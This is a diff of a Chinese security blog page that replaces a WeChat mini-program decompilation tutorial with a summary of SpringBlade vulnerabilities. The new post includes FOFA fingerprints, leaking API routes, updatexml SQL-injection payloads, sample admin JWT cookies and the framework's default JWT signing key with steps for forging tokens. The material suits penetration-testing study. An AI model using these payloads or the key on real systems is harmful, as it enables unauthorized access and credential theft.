@@ -16,26 +16,32 @@
   <meta name="author" content="Yf3te">
   <meta name="keywords" content="">
   
-    <meta name="description" content="小程序解密+反编译 将访问的小程序进行解密和反向编译拿到部分源码，然后对源码进行安全审计，分析出其中可能存在的信息泄露或者说路径等一些关键信息。  前置环境准备1、nodejs环境安装（https:&#x2F;&#x2F;nodejs.org&#x2F;en，官网安装即可） 2、解密反编译工具(wxapkg：https:&#x2F;&#x2F;github.com&#x2F;wux1an&#x2F;wxapkg&#x2F;releases&#x2F;tag&#x2F;v1.5.0) 3、微信小程">
+    <meta name="description" content="前言在挖src碰巧遇到了springBlade框架，就此浅显总结一下 简介&amp;特征 SpringBlade是一个基于Spring Boot和Spring Cloud的微服务架构框架，它是由商业级项目升级优化而来的综合型项目。Springblade是基于spring-boot开发的，接口泄露、sql注入他也存在。  sringblade的特征1 1icon_hash&#x3D;&quot;1047841">
 <meta property="og:type" content="article">
-<meta property="og:title" content="小程序反编译">
-<meta property="og:url" content="http://example.com/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/index.html">
+<meta property="og:title" content="springblade漏洞总结">
+<meta property="og:url" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Yf3te">
-<meta property="og:description" content="小程序解密+反编译 将访问的小程序进行解密和反向编译拿到部分源码，然后对源码进行安全审计，分析出其中可能存在的信息泄露或者说路径等一些关键信息。  前置环境准备1、nodejs环境安装（https:&#x2F;&#x2F;nodejs.org&#x2F;en，官网安装即可） 2、解密反编译工具(wxapkg：https:&#x2F;&#x2F;github.com&#x2F;wux1an&#x2F;wxapkg&#x2F;releases&#x2F;tag&#x2F;v1.5.0) 3、微信小程">
+<meta property="og:description" content="前言在挖src碰巧遇到了springBlade框架，就此浅显总结一下 简介&amp;特征 SpringBlade是一个基于Spring Boot和Spring Cloud的微服务架构框架，它是由商业级项目升级优化而来的综合型项目。Springblade是基于spring-boot开发的，接口泄露、sql注入他也存在。  sringblade的特征1 1icon_hash&#x3D;&quot;1047841">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled-1723536749584-9.png">
-<meta property="og:image" content="http://example.com/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%201-1723536749584-11.png">
-<meta property="og:image" content="http://example.com/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%202-1723536749584-10.png">
-<meta property="og:image" content="http://example.com/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%203-1723536749584-12.png">
-<meta property="article:published_time" content="2024-08-13T08:08:57.000Z">
-<meta property="article:modified_time" content="2024-08-13T08:12:30.619Z">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813164919993.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165144101.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165244200.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132515446.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813134409260.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132621776.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132658231.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170002896.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170028058.png">
+<meta property="og:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170043219.png">
+<meta property="article:published_time" content="2024-08-14T05:28:57.000Z">
+<meta property="article:modified_time" content="2024-08-14T05:31:40.308Z">
 <meta property="article:author" content="Yf3te">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled-1723536749584-9.png">
+<meta name="twitter:image" content="http://example.com/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813164919993.png">
   
   
   
-  <title>小程序反编译 - Yf3te</title>
+  <title>springblade漏洞总结 - Yf3te</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -230,7 +236,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="小程序反编译"></span>
+            <span id="subtitle" data-typed-text="springblade漏洞总结"></span>
           
         </div>
 
@@ -241,8 +247,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-08-13 16:08" pubdate>
-          2024年8月13日 下午
+        <time datetime="2024-08-14 13:28" pubdate>
+          2024年8月14日 下午
         </time>
       </span>
     
@@ -253,7 +259,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          797 字
         
       </span>
     
@@ -264,7 +270,7 @@
         
         
         
-          10 分钟
+          7 分钟
         
       </span>
     
@@ -309,44 +315,69 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">小程序反编译</h1>
+            <h1 id="seo-header">springblade漏洞总结</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="小程序解密-反编译"><a href="#小程序解密-反编译" class="headerlink" title="小程序解密+反编译"></a>小程序解密+反编译</h1><blockquote>
-<p><strong>将访问的小程序进行解密和反向编译拿到部分源码，然后对源码进行安全审计，分析出其中可能存在的信息泄露或者说路径等一些关键信息。</strong></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在挖src碰巧遇到了springBlade框架，就此浅显总结一下</p>
+<h2 id="简介-特征"><a href="#简介-特征" class="headerlink" title="简介&amp;特征"></a>简介&amp;特征</h2><blockquote>
+<p>SpringBlade是一个基于Spring Boot和Spring Cloud的微服务架构框架，它是由商业级项目升级优化而来的综合型项目。Springblade是基于spring-boot开发的，接口泄露、sql注入他也存在。</p>
 </blockquote>
-<h2 id="前置环境准备"><a href="#前置环境准备" class="headerlink" title="前置环境准备"></a>前置环境准备</h2><p>1、nodejs环境安装（<a target="_blank" rel="noopener" href="https://nodejs.org/en">https://nodejs.org/en</a>，官网安装即可）</p>
-<p>2、解密反编译工具(wxapkg：<a target="_blank" rel="noopener" href="https://github.com/wux1an/wxapkg/releases/tag/v1.5.0">https://github.com/wux1an/wxapkg/releases/tag/v1.5.0</a>)</p>
-<p>3、微信小程序（一般大厂的小程序可能存在无法反编译，选一些简单点的就行）</p>
-<h2 id="反编译最初目录结构"><a href="#反编译最初目录结构" class="headerlink" title="反编译最初目录结构"></a>反编译最初目录结构</h2><p>示例：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>myApp<span class="hljs-operator">/</span><br><span class="hljs-number">2</span>  ├── app.json   ——小程序全局配置文件，用于定义小程序的基本属性和页面路径。）            <br><span class="hljs-number">3</span>  ├── app.wxss   ——全局样式表，定义整个小程序的公共样式。）<br><span class="hljs-number">4</span>  ├── app.js     ——小程序的入口文件，可以在这里进行全局数据初始化、监听、处理等。<br><span class="hljs-number">5</span>  ├── project.config.json ——项目配置文件，用于设置编译模式、调试模式、云开发环境等信息。<br><span class="hljs-number">6</span>  ├── pages<span class="hljs-operator">/</span>      <span class="hljs-operator">-</span> 存放所有页面文件的地方，每个页面由以下四个同名文件组成：<br><span class="hljs-number">7</span>  │   ├── index<span class="hljs-operator">/</span>   <br><span class="hljs-number">8</span>  │   │   ├── index.wxml    ——页面结构文件，使用类似HTML的WXML语言编写。<br><span class="hljs-number">9</span>  │   │   ├── index.wxss    ——页面样式文件，使用WXSS语言编写，用于定义该页面的样式，类似css<br><span class="hljs-number">10</span> │   │   ├── index.js      ——页面逻辑文件，使用JavaScript编写，用于处理页面逻辑和数据交互。<br><span class="hljs-number">11</span> │   │   └── index.json    ——页面配置文件，用于定义页面的窗口样式和一些其他页面级别的配置。<br><span class="hljs-number">12</span> │   └── about<span class="hljs-operator">/</span><br><span class="hljs-number">13</span> │       ├── about.wxml<br><span class="hljs-number">14</span> │       ├── about.wxss<br><span class="hljs-number">15</span> │       ├── about.js<br><span class="hljs-number">16</span> │       └── about.json<br><span class="hljs-number">17</span> ├── components<span class="hljs-operator">/</span>       ——存放可复用的组件文件夹，组件同样有 .wxml, .wxss, .js 和 .json 文件。<br><span class="hljs-number">18</span> │   └── myComponent<span class="hljs-operator">/</span><br><span class="hljs-number">19</span> │       ├── myComponent.wxml<br><span class="hljs-number">20</span> │       ├── myComponent.wxss<br><span class="hljs-number">21</span> │       ├── myComponent.js<br><span class="hljs-number">22</span> │       └── myComponent.json<br><span class="hljs-number">23</span> ├── utils<span class="hljs-operator">/</span>          ——存放工具函数的文件夹，例如日期处理、数据加密解密等。<br><span class="hljs-number">24</span> │   └── api.js<br><span class="hljs-number">25</span> ├── <span class="hljs-keyword">static</span><span class="hljs-operator">/</span>   ——存放静态资源如图片、字体、音频视频等文件。<br><span class="hljs-number">26</span> │   └── logo.png<br><span class="hljs-number">27</span> ├── api<span class="hljs-operator">/</span>    ——通常用于存放网络请求相关的代码，如与后端服务器的数据交互。<br><br>上述结构中，pages<span class="hljs-operator">/</span>index<span class="hljs-operator">/</span> 目录下的文件构成了首页，而 pages<span class="hljs-operator">/</span>about<span class="hljs-operator">/</span> 目录下的文件则构成了关于页面。每个页面的四个文件组成了一个完整的页面模块。<br></code></pre></td></tr></table></figure>
+<p><strong>sringblade的特征1</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">icon_hash</span>=<span class="hljs-string">&quot;1047841028&quot;</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="反编译目录结构（微信服务器整合）"><a href="#反编译目录结构（微信服务器整合）" class="headerlink" title="反编译目录结构（微信服务器整合）"></a>反编译目录结构（微信服务器整合）</h2><p>反编译后的目录结构主要由反编译的工具决定，反编译后的目录结构除了上述最原始的目录，还包括一下由微信服务器整合过后的结构。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">只是把部分文件进行了合并<br>app<span class="hljs-operator">-</span>config.json<br>小程序工程主要包括工具配置 project.config.json，全局配置 app.json 以及页面配置 page.json 三类 JSON 配置文件。<br><br>app<span class="hljs-operator">-</span>service.js<br>在小程序项目中 JS 文件负责交互逻辑，主要包括 app.js，每个页面的 page.js，开发者自定义的 JS 文件和引入的第三方 JS 文件，在“编译”后所有这些 JS 文件都会被汇总到app<span class="hljs-operator">-</span>service.js 文件中<br><br>app<span class="hljs-operator">-</span>wxss.js<br>在小程序项目中 wxss 文件负责交互逻辑，主要包括 app.wxss，以及每个页面的wxss文件<br></code></pre></td></tr></table></figure>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813164919993.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813164919993">
 
-<h2 id="开始反编译"><a href="#开始反编译" class="headerlink" title="开始反编译"></a>开始反编译</h2><h3 id="1、定位微信小程序目录的位置"><a href="#1、定位微信小程序目录的位置" class="headerlink" title="1、定位微信小程序目录的位置"></a>1、定位微信小程序目录的位置</h3><p>登录微信——&gt;设置——&gt;文件管理</p>
-<img src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled-1723536749584-9.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+<p><strong>特征2</strong></p>
+<p>在页面加载过程中，会出现以下的加载页面，和最下方的<code>https://bladex.vip</code>，此时我们就可以将这个地址放到fofa上去扩大资产</p>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165144101.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813165144101">
 
-<p>然后随机挑选一个小程序打开（尽量多点点其中的功能点）</p>
-<p>定位到该目录下的Applet，通过时间找到指定小程序的目录即可</p>
-<img src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%201-1723536749584-11.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">fofa：body<span class="hljs-operator">=</span><span class="hljs-string">&quot;https://bladex.vip&quot;</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="2、使用解密-反编译工具开始反编译"><a href="#2、使用解密-反编译工具开始反编译" class="headerlink" title="2、使用解密&amp;反编译工具开始反编译"></a>2、使用解密&amp;反编译工具开始反编译</h3><p>反编译的工具还有unveilr（<a target="_blank" rel="noopener" href="https://github.com/junxiaqiao/unveilr-v2.0.0%EF%BC%89%E3%80%81%E5%B0%8F%E9%94%A6%E5%93%A5%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%B7%A5%E5%85%B7%EF%BC%88[https://get-shell.com/3458.html](https://get-shell.com/3458.html)%EF%BC%89%EF%BC%8C%E4%B8%8D%E8%BF%87%E7%BB%8F%E8%BF%87%E5%8F%8D%E7%BC%96%E8%AF%91%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E5%AF%B9%E6%AF%94%E5%BE%97%E5%87%BA%EF%BC%9A%E8%99%BD%E7%84%B6wxapkg%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E5%86%85%E5%AE%B9%E6%AF%94%E4%B8%8A%E8%BF%B0%E4%B8%A4%E6%AC%BE%E6%9B%B4%E5%A4%9A%EF%BC%8C%E4%BD%86unveilr%E5%8F%8D%E7%BC%96%E8%AF%91%E6%9B%B4%E7%AC%A6%E5%90%88%E4%BC%A0%E7%BB%9F%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%EF%BC%8C%E6%9B%B4%E9%80%82%E5%90%88%E6%88%91%E4%BB%AC%E5%88%86%E6%9E%90%EF%BC%8C%E5%8F%AA%E8%83%BD%E8%AF%B4%E5%90%84%E6%9C%89%E4%BC%98%E5%8A%A3%E3%80%82">https://github.com/junxiaqiao/unveilr-v2.0.0）、小锦哥小程序工具（[https://get-shell.com/3458.html](https://get-shell.com/3458.html)），不过经过反编译后的结果对比得出：虽然wxapkg反编译的内容比上述两款更多，但unveilr反编译更符合传统的微信小程序的目录结构，更适合我们分析，只能说各有优劣。</a></p>
-<p>1、wxapkg</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">wxapkg.exe unpack <span class="hljs-operator">-</span>o unpack <span class="hljs-operator">-</span>r &quot;E:\ASUS\Documents\WeChat Files\Applet\wx1467dbe575243210&quot;<br></code></pre></td></tr></table></figure>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813165244200.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813165244200">
 
-<img src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%202-1723536749584-10.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+<p><strong>特征3</strong></p>
+<p>在路径中若发现<code>blade</code>，这个字段，也基本可以确定是blade框架</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/api/</span>blade-user/info<br><span class="hljs-regexp">/api/</span>blade-auth<span class="hljs-regexp">/oauth/</span>captcha<br>.....<br></code></pre></td></tr></table></figure>
 
-<p>但这并不是最初的原项目文件结构，原因是微信服务器会将小程序源码中所有的“js”文件压入“app-service.js”文件中，将所有的“json”文件压入“app-config.json”中，将所有的“wxml”文件压入“page-frame.js”文件中，“wxss”则在处理之后以“js”文件的形式存留在对应页面目录之下。</p>
-<p>2、unveilr</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">unveilr.exe wx &quot;D:\WeChat Files\Applet\wx7c8d593b2c3a7703\92\&quot; <span class="hljs-operator">-</span>o .\tyt <span class="hljs-operator">-</span>f<br></code></pre></td></tr></table></figure>
+<h2 id="常见漏洞-实例"><a href="#常见漏洞-实例" class="headerlink" title="常见漏洞&amp;实例"></a>常见漏洞&amp;实例</h2><h3 id="漏洞一：接口泄露"><a href="#漏洞一：接口泄露" class="headerlink" title="漏洞一：接口泄露"></a>漏洞一：接口泄露</h3><p>正常接口路径：&#x2F;api&#x2F;blade-system&#x2F;，不过开发人员一般会改路径，可能改为&#x2F;oaApi&#x2F;blade-system&#x2F;，也可能表面呈现<a target="_blank" rel="noopener" href="http://xxx.com/#/system%EF%BC%8C%E8%BF%99%E7%A7%8D%E5%BD%A2%E5%BC%8F%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%8A%93%E5%8C%85%E5%90%8E%E5%B0%B1%E4%BC%9A%E6%98%BE%E9%9C%B2%E4%BC%9A/api/blade-system/%E8%BF%99%E7%A7%8D%E5%BD%A2%E5%BC%8F%E3%80%82">http://xxx.com/#/system，这种形式，不过抓包后就会显露会/api/blade-system/这种形式。</a></p>
+<p>下述就是没有修改的路由的案例</p>
+<p>其中比较常见的泄露：</p>
+<p>&#x2F;api&#x2F;blade-system&#x2F;menu&#x2F;buttons   #暴露路由</p>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132515446.png" srcset="/img/loading.gif" lazyload class="" title="image-20240814132515446">
 
-<img src="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/Untitled%203-1723536749584-12.png" srcset="/img/loading.gif" lazyload class="" title="Untitled">
+<p>&#x2F;api&#x2F;blade-system&#x2F;user&#x2F;user-list     #泄露用户名、密码（包括管理员）</p>
+<p>&#x2F;api&#x2F;blade-resource&#x2F;oss&#x2F;list        #泄露AK、SK</p>
+<p>不仅如此，在js文件类里面也会泄露jwt，可直接访问</p>
+<p>泄露的路由还有如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">下述只对找到的案例存在的路由进行了解释：<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/user/u</span>ser-list   <span class="hljs-comment">#用户列表</span><br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/tenant/</span>select		<span class="hljs-comment">#租户选择</span><br><span class="hljs-regexp">/api/</span>blade-develop<span class="hljs-regexp">/datasource/</span>list	<br><span class="hljs-regexp">/api/</span>blade-resource<span class="hljs-regexp">/oss/</span>list<br><span class="hljs-regexp">/api/</span>blade-develop<span class="hljs-regexp">/datasource/</span>list<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/code/</span>remove<br><span class="hljs-regexp">/api/</span>blade-resource<span class="hljs-regexp">/oss/</span>remove<br><span class="hljs-regexp">/api/</span>blade-system<span class="hljs-regexp">/dict-biz/</span>remove<br><span class="hljs-regexp">/authority/</span>role/add    <span class="hljs-comment">#添加用户</span><br><span class="hljs-regexp">/system/</span>dict/add	<span class="hljs-comment">#添加字典</span><br>.......<br></code></pre></td></tr></table></figure>
 
-<h3 id="3、编译完成"><a href="#3、编译完成" class="headerlink" title="3、编译完成"></a>3、编译完成</h3><p>访问反编译成功的文件，开始提取敏感信息和代码审计即可</p>
-<h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><p>弱口令、AS、AK、敏感信息、接口泄露</p>
+<h3 id="漏洞二：弱口令-AK、SK泄露"><a href="#漏洞二：弱口令-AK、SK泄露" class="headerlink" title="漏洞二：弱口令&amp;AK、SK泄露"></a>漏洞二：弱口令&amp;AK、SK泄露</h3><p>这个站点很奇葩，当我登录的时候，他自动就把账号和密码（也是弱口令）填写进去了，直接登陆即可了，进去大概看了一下就泄露了</p>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813134409260.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813134409260">
+
+<p>然后直接使用ossbrower连接即可</p>
+<h3 id="漏洞三：SQL注入"><a href="#漏洞三：SQL注入" class="headerlink" title="漏洞三：SQL注入"></a>漏洞三：SQL注入</h3><p>第一处：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/api/blade-<span class="hljs-built_in">log</span>/<span class="hljs-keyword">error</span>/<span class="hljs-built_in">list</span>?updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">version</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132621776.png" srcset="/img/loading.gif" lazyload class="" title="image-20240814132621776">
+
+<p>第二处：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/api/blade-<span class="hljs-keyword">user</span>/export-<span class="hljs-keyword">user</span>?Blade-Auth=[jwt码]&amp;account=&amp;realName=&amp;<span class="hljs-number">1</span>-updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,version(),<span class="hljs-number">0x5c</span>),<span class="hljs-number">1</span>)=<span class="hljs-number">1</span><br><br>如果前端使用的saber，则可以用下述saber-<span class="hljs-keyword">access</span>-token/saber-<span class="hljs-keyword">refresh</span>-token替换上述的jwt码，下面一个漏洞也同理<br><br>```<br>Cookie: saber-<span class="hljs-keyword">access</span>-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwidG9rZW5fdHlwZSI6ImFjY2Vzc190b2tlbiIsImRlcHRfaWQiOiIxMTIzNTk4ODEzNzM4Njc1MjAxIiwiYWNjb3VudCI6ImFkbWluIiwiY2xpZW50X2lkIjoic2FiZXIiLCJleHAiOjE3MjM2MDE3NTcsIm5iZiI6MTcyMzU5ODE1N30.N4arC25-V_qBBlxmjLlvvN2VaZ3iPvc-xht2VEPMOq4; saber-<span class="hljs-keyword">refresh</span>-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInRva2VuX3R5cGUiOiJyZWZyZXNoX3Rva2VuIiwiY2xpZW50X2lkIjoic2FiZXIiLCJleHAiOjE3MjQyMDI5NTcsIm5iZiI6MTcyMzU5ODE1N30<span class="hljs-number">.0</span>U0aZzVdesBjS3VNBFyDN1D7jFWM54XPd6kdWHWL394<br>```<br></code></pre></td></tr></table></figure>
+
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240814132658231.png" srcset="/img/loading.gif" lazyload class="" title="image-20240814132658231">
+
+<h3 id="漏洞四：JWT硬编码越权"><a href="#漏洞四：JWT硬编码越权" class="headerlink" title="漏洞四：JWT硬编码越权"></a>漏洞四：JWT硬编码越权</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject</span><br></code></pre></td></tr></table></figure>
+
+<p>漏洞原因：开发者在使用jwt进行身份认证时，并没有对默认的jwt密钥进行修改，导致黑客可以利用默认的jwt密钥去伪造jwt值，可以欺骗服务器获取用户权限等</p>
+<p>教程：将上面的密钥放到箭头指示的位置，然后修改payload里的字段，因为服务器都是通过这个payload中的字段进行鉴权的，所以通过修改payload中的字段，来达到伪造jwt欺骗服务器</p>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170002896.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813170002896">
+
+<p>将修改后的jwt字段，放回Blade-Auth中，放包，看是否回显，若回显，则证明存在jwt硬编码。</p>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170028058.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813170028058">
+
+<p>不成功则会出现未授权</p>
+<img src="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20240813170043219.png" srcset="/img/loading.gif" lazyload class="" title="image-20240813170043219">
 
                 
               </div>
@@ -364,8 +395,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>小程序反编译</div>
-      <div>http://example.com/2024/08/13/小程序反编译/</div>
+      <div>springblade漏洞总结</div>
+      <div>http://example.com/2024/08/14/springblade漏洞总结/</div>
     </div>
     <div class="license-meta">
       
@@ -377,7 +408,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年8月13日</div>
+          <div>2024年8月14日</div>
         </div>
       
       
@@ -409,18 +440,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/08/14/springblade%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="springblade漏洞总结">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">springblade漏洞总结</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/08/12/OSS%E4%BA%91%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2/" title="OSS云存储攻防">
-                        <span class="hidden-mobile">OSS云存储攻防</span>
+                      <a href="/2024/08/13/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91/" title="小程序反编译">
+                        <span class="hidden-mobile">小程序反编译</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
